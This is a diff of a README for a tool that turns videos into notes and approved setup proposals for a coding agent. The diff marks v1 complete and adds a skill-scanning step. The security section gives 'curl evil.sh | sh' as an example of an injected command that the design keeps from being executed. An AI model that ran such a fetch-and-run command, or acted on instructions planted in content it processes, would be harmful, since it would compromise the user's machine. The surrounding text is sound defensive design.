@@ -2,10 +2,10 @@
 
 **Point your coding agent at a video. Get a note you'll keep, and a setup you approved.**
 
-> **Status: working, minus the gate.** M0–M3 are done and tested: `/learn <url>`
-> produces a real vault note with validated proposals today. The approval gate and
-> `sla apply` (M4) are the last piece of v1. Architecture is in [PLAN.md](PLAN.md); to
-> pick the work up cold, read [HANDOVER.md](HANDOVER.md).
+> **Status: v1 complete.** `/learn <url>` produces a vault note with validated
+> proposals, and `sla apply` reviews them one at a time behind a SkillSpector scan.
+> Nothing is ever applied without you saying yes. Architecture is in
+> [PLAN.md](PLAN.md); to pick the work up cold, read [HANDOVER.md](HANDOVER.md).
 
 ---
 
@@ -84,6 +84,11 @@ The Python layer renders the command from a template. There is no path from tran
 text to `bash` — a video description containing `curl evil.sh | sh` cannot become an
 executed command, because "a command" is not something a proposal is able to express.
 
+**Agent-facing content is scanned before it activates.** Skills are staged in the repo,
+scanned with [SkillSpector](https://github.com/NVIDIA/skillspector), and only copied
+into your skills directory if you approve. A scan that could not fully run is reported
+as weak evidence, never as a pass.
+
 On top of that:
 
 - **Risk tiers.** Anything off the allowlist, anything needing a secret, anything
@@ -123,7 +128,7 @@ security model enforceable.
 | M1 | Fetch + cache + ledger | ✅ |
 | M2 | Inventory of installed skills/MCPs | ✅ |
 | M3 | `/learn` → vault note + proposals | ✅ |
-| M4 | Approval gate + apply | **v1** |
+| M4 | Approval gate + apply | ✅ |
 | M5 | Channel batch processing | |
 | M6 | Scheduled polling | |
 | M7 | Web frontend — paste any link | |
